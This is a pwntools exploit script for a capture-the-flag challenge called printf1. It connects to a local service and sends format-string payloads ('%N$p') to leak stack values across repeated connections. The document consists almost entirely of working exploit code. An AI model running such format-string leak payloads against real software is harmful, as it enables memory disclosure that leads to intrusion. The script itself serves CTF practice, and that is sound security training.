#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --port 14001 --host localhost --libc ./libc.so.6 ../src/printf1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '../src/printf1')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'localhost'
port = int(args.PORT or 14001)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOCAL_LIBC` argument.
# ./exploit.py LOCAL LOCAL_LIBC
if args.LOCAL_LIBC:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')
else:
    libc = ELF('./libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Full RELRO
# Stack:      Canary found
# NX:         NX enabled
# PIE:        PIE enabled
# RUNPATH:    b'/home/ena/coding/remote/ctfs/magpiesctf/2025/pwn/printf1/src/../../'
# Stripped:   No
# Debuginfo:  Yes

parts = []
for i in range(1, 10):
    io = start()
    
    # the return address of main is the 7th stack var
    
    io.recvuntil(b"something: ")
    
    payload = "|".join([f"%{j}$p" for j in range(i * 10, (i * 10) + 10)])
    io.sendline(payload.encode('ascii'))
    
    io.recvuntil(b"said:")
    part = io.recvuntil(b"I bet", drop=True).decode('ascii')
    io.close()

    for p in part.split("|"):
        parts.append(p)

for index, part in enumerate(parts):
    print(f"{index}: {part}")

